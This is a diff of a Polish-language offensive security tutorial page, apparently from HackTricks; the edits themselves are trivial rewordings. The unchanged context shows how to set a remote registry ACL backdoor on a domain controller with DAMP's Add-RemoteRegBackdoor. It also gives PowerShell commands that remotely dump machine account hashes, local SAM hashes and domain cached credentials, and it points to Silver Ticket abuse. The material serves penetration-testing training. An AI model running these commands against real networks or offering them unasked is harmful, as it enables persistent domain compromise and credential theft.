@@ -26,7 +26,7 @@ Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remo
 ```
 ### Zdalny dostęp do hashy
 
-Uzyskaj dostęp do **rejestru** i **zrzucaj hashe**, tworząc **tylną furtkę w rejestrze używając** [**DAMP**](https://github.com/HarmJ0y/DAMP)**,** aby w każdej chwili móc odzyskać **hash komputera**, **SAM** oraz wszelkie **cached AD** poświadczenia na komputerze. Dlatego bardzo przydatne jest nadanie tego uprawnienia **zwykłemu użytkownikowi w stosunku do komputera kontrolera domeny**:
+Uzyskaj dostęp do **rejestru** i **zrzucaj hashe**, tworząc **tylną furtkę w rejestrze używając** [**DAMP**](https://github.com/HarmJ0y/DAMP)**,** aby w każdej chwili móc odzyskać **hash komputera**, **SAM** oraz wszelkie **cached AD** poświadczenia na komputerze. Dlatego bardzo przydatne jest nadanie tej zgody **zwykłemu użytkownikowi w stosunku do komputera kontrolera domeny**:
 ```bash
 # allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
 Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose
@@ -40,6 +40,6 @@ Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose
 # Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.
 Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
 ```
-Sprawdź [**Silver Tickets**](silver-ticket.md), aby dowiedzieć się, jak możesz wykorzystać hash konta komputera kontrolera domeny.
+Sprawdź [**Silver Tickets**](silver-ticket.md), aby dowiedzieć się, jak możesz wykorzystać hash konta komputera kontrolera domeny. 
 
 {{#include ../../banners/hacktricks-training.md}}
